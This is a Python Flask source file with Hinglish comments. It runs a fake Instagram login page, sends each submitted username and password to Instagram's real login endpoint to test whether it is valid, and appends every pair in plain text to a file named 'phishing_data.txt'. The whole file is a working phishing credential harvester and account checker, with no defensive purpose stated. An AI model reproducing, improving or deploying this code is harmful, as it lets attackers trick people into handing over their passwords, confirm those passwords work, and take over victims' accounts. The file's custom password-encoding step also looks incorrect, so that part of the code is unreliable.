import requests
from flask import Flask, render_template, request
import time
import hashlib
import os

app = Flask(__name__)

def get_csrf_token():
    """Instagram se CSRF token aur session fetch karta hai."""
    session = requests.Session()
    try:
        response = session.get("https://www.instagram.com/")
        if response.status_code == 200:
            csrf_token = session.cookies.get('csrftoken')
            if not csrf_token:
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(response.text, 'html.parser')
                csrf_token = soup.find('meta', attrs={'name': 'csrfmiddlewaretoken'})['content']
            
            return session, csrf_token
    except Exception as e:
        print(f"Token Error: {e}")
    return None, None

def login_to_instagram(username, password):
    """Real Instagram API ko target karta hai."""
    session, csrf_token = get_csrf_token()
    if not session:
        return False, "Server connect nahi ho paaya."

    login_url = "https://www.instagram.com/accounts/login/ajax/"
    
    # Password Hashing
    timestamp = int(time.time())
    hashed_password = hashlib.sha256(password.encode('utf-8')).hexdigest()
    enc_password = f"PWD{timestamp}#{hashed_password}"

    # Headers (Critical: X-IG-App-ID aur queryParams fix kiya)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'X-CSRFToken': csrf_token,
        'X-IG-App-ID': '936619743392459',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://www.instagram.com/',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Origin': 'https://www.instagram.com',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }
    
    # Cookie Fix
    cookies_dict = session.cookies.get_dict()
    cookie_header = "; ".join([f"{k}={v}" for k, v in cookies_dict.items()])
    headers['Cookie'] = cookie_header

    # Data Payload (Fixed format: {{}} instead of {})
    data = {
        'username': username,
        'enc_password': enc_password,
        'queryParams': '{{}}', 
        'optIntoOneTap': 'false',
        'stopDeletion': 'false',
        'trustedDevice': 'false'
    }

    try:
        response = session.post(login_url, headers=headers, data=data)
        
        print(f"--- DEBUG ---")
        print(f"Status: {response.status_code}")
        print(f"Response: {response.text}")
        
        if response.status_code == 200:
            if 'ds_user_id' in session.cookies:
                return True, "✅ Password Sahi Hai!"
            else:
                return False, "❌ Password Galat Hai."
        else:
            return False, f"❌ Server Error ({response.status_code})"
            
    except Exception as e:
        print(f"Exception: {e}")
        return False, f"❌ Error: {e}"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def handle_login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    if username and password:
        print(f"\n📝 Testing ID: {username}")
        
        success, message = login_to_instagram(username, password)
        
        # File mein save karna
        try:
            with open("phishing_data.txt", "a") as f:
                f.write(f"{username}|{password}\n")
            print(f"💾 Data Saved to: phishing_data.txt")
        except Exception as e:
            print(f"❌ File save error: {e}")

        return render_template('index.html', result=message, username=username)
    
    return render_template('index.html', result="⚠️ Please enter ID and Password.")

if __name__ == '__main__':
    # Agar file exist nahi karti toh create kar do
    if not os.path.exists("phishing_data.txt"):
        open("phishing_data.txt", "w").close()
        
    print("🚀 Server: http://127.0.0.1:5000")
    app.run(debug=True, port=5000)
